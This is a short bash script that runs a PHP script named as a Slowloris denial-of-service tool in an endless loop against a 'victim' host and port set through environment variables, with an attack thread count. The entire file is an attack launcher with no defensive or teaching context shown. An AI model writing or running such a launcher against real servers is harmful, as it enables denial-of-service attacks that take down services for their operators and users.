#!/usr/bin/env bash

while true
do
    php /code/src/slowlories-script.php random "$ATTACK_NUMBER_OF_THREADS" "$VICTIM_HOST" "$VICTIM_PORT"
done
